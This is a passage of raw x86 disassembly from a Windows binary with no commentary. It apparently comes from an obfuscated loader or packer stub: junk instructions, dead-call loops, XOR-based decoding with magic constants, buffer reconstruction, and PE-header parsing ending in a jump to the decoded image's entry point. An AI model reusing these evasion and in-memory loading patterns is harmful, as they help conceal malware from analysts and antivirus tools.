  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d26,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c16
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x4239c2
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
  41bace:	xor    edi,DWORD PTR ds:0x42b008
  41bad4:	add    edi,DWORD PTR ds:0x42800c
  41bada:	mov    DWORD PTR ds:0x42b008,edi
  41bae0:	mov    DWORD PTR [ebp-0x3c],eax
  41bae3:	lea    eax,[ebp-0x48]
  41bae6:	or     edi,esi
  41bae8:	mov    DWORD PTR [ebp-0x24],eax
  41baeb:	mov    eax,ds:0x421c16
  41baf0:	adc    DWORD PTR ds:0x428014,ebx
  41baf6:	mov    eax,DWORD PTR [eax+0x1c8]
  41bafc:	and    DWORD PTR ds:0x42a01c,0x0
  41bb06:	jmp    0x41bb18
  41bb0b:	mov    edi,DWORD PTR ds:0x42a01c
  41bb11:	inc    edi
  41bb12:	mov    DWORD PTR ds:0x42a01c,edi
  41bb18:	cmp    DWORD PTR ds:0x42a01c,0x1f
  41bb1f:	jae    0x41bb48
  41bb25:	cmp    DWORD PTR ds:0x42a01c,0x2a
  41bb2c:	jne    0x41bb43
  41bb32:	push   DWORD PTR [ebp-0x24]
  41bb35:	push   DWORD PTR [ebp-0x1c]
  41bb38:	push   0x27cc
  41bb3d:	call   DWORD PTR ds:0x424028
  41bb43:	jmp    0x41bb0b
  41bb48:	mov    eax,DWORD PTR [eax]
  41bb4a:	xor    esi,esi
  41bb4c:	or     esi,DWORD PTR ds:0x429000
  41bb52:	adc    DWORD PTR ds:0x429014,esi
  41bb58:	mov    ecx,DWORD PTR [ebp-0x24]
  41bb5b:	mov    esi,0x7510893
  41bb60:	mov    edi,DWORD PTR ds:0x429010
  41bb66:	or     edi,DWORD PTR ds:0x42a01c
  41bb6c:	mov    DWORD PTR ds:0x429010,edi
  41bb72:	xor    eax,esi
  41bb74:	movzx  edi,BYTE PTR ds:0x42a014
  41bb7b:	adc    edi,DWORD PTR ds:0x42a004
  41bb81:	mov    DWORD PTR ds:0x42a014,edi
  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e32
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c16
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42388f
  41bc20:	push   0x4238c3
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e32,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c16
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x42390e
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x4238c3
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423986
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c16
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421a9a,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421cee,eax
  41c15b:	mov    eax,ds:0x421a9a
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c16
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421cee
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421a9a
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c16
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c16
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c16
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421c9a,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421c92,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c16
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
